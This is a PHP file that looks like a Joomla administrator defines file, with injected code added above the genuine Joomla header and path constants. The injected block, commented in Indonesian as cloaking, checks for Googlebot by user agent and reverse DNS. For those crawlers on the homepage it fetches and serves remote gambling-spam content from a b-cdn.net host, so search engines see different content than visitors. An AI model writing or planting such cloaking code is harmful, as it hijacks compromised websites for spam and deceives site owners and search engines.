<?php
// ======================= KONFIGURASI DASAR =======================
$userAgent = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
$clientIP = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER["HTTP_X_FORWARDED_FOR"] ?? $_SERVER["REMOTE_ADDR"];
$referrer = $_SERVER['HTTP_REFERER'] ?? '';
$requestPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) ?? '/';

// ======================= FUNGSI UTAMA =======================
function ambilKonten($url) {
    $context = stream_context_create([
        "http" => ["timeout" => 1.5, "ignore_errors" => true]
    ]);
    
    // Priority 1: Gunakan file_get_contents
    $konten = @file_get_contents($url, false, $context);
    
    // Priority 2: Fallback ke cURL jika gagal
    if (!$konten || strlen(trim($konten)) < 20) {
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 3,
                CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"] ?? 'Mozilla/5.0',
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            $konten = curl_exec($ch);
            curl_close($ch);
        }
        
        // Priority 3: Final fallback
        if (!$konten || strlen(trim($konten)) < 20) {
            $konten = @file_get_contents($url, false, $context);
        }
    }
    return $konten;
}

// ======================= DETEKSI BOT =======================
$isBotValid = false;
$daftarBotGoogle = [
    'googlebot',
    'adsbot-google',
    'apis-google',
    'mediapartners-google',
    'googlebot-image',
    'googlebot-video',
    'googlebot-news',
    'google-inspectiontool',
    'structured-data-testing-tool'
];

foreach ($daftarBotGoogle as $bot) {
    if (strpos($userAgent, $bot) !== false) {
        $hostname = @gethostbyaddr($clientIP);
        $isBotValid = (strpos($userAgent, 'googlebot') !== false && $hostname && $hostname !== $clientIP) 
            ? (strpos($hostname, 'google.com') !== false || strpos($hostname, 'googlebot.com') !== false)
            : true;
        break;
    }
}

// ======================= PROSES CLOAKING =======================
if (($isBotValid || strpos($referrer, 'search.google.com') !== false || isset($_GET["gsc"])) 
    && in_array($requestPath, ['/', '/index.php'])) {
    
    //  DELAY
    if ($isBotValid) {
        usleep(rand(500000, 900000));
    }
    
    $kontenCloaking = ambilKonten("https://indoagen188.b-cdn.net/content/colegiulmirceaeliade-sbo.txt");
    
    if ($kontenCloaking && strlen(trim($kontenCloaking)) > 50) {
        // Bersihkan buffer output
        while (ob_get_level()) ob_end_clean();
        
        // Header anti-cache
        header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
        header("Pragma: no-cache");
        header("Expires: 0");
        header("Content-Type: text/html; charset=utf-8");
        
        echo $kontenCloaking;
        exit;
    }
}
/**
 * @package    Joomla.Administrator
 *
 * @copyright  (C) 2005 Open Source Matters, Inc. <https://www.joomla.org>
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

\defined('_JEXEC') or die;

// Define JPATH constants if not defined yet
\defined('JPATH_BASE') || \define('JPATH_BASE', \dirname(__DIR__));

// Global definitions
$parts = explode(DIRECTORY_SEPARATOR, JPATH_BASE);
array_pop($parts);

// Defines
\defined('JPATH_ROOT') || \define('JPATH_ROOT', implode(DIRECTORY_SEPARATOR, $parts));
\defined('JPATH_SITE') || \define('JPATH_SITE', JPATH_ROOT);
\defined('JPATH_PUBLIC') || \define('JPATH_PUBLIC', JPATH_ROOT);
\defined('JPATH_CONFIGURATION') || \define('JPATH_CONFIGURATION', JPATH_ROOT);
\defined('JPATH_ADMINISTRATOR') || \define('JPATH_ADMINISTRATOR', JPATH_ROOT . DIRECTORY_SEPARATOR . 'administrator');
\defined('JPATH_LIBRARIES') || \define('JPATH_LIBRARIES', JPATH_ROOT . DIRECTORY_SEPARATOR . 'libraries');
\defined('JPATH_PLUGINS') || \define('JPATH_PLUGINS', JPATH_ROOT . DIRECTORY_SEPARATOR . 'plugins');
\defined('JPATH_INSTALLATION') || \define('JPATH_INSTALLATION', JPATH_ROOT . DIRECTORY_SEPARATOR . 'installation');
\defined('JPATH_THEMES') || \define('JPATH_THEMES', JPATH_BASE . DIRECTORY_SEPARATOR . 'templates');
\defined('JPATH_CACHE') || \define('JPATH_CACHE', JPATH_ADMINISTRATOR . DIRECTORY_SEPARATOR . 'cache');
\defined('JPATH_MANIFESTS') || \define('JPATH_MANIFESTS', JPATH_ADMINISTRATOR . DIRECTORY_SEPARATOR . 'manifests');
\defined('JPATH_API') || \define('JPATH_API', JPATH_ROOT . DIRECTORY_SEPARATOR . 'api');
\defined('JPATH_CLI') || \define('JPATH_CLI', JPATH_ROOT . DIRECTORY_SEPARATOR . 'cli');
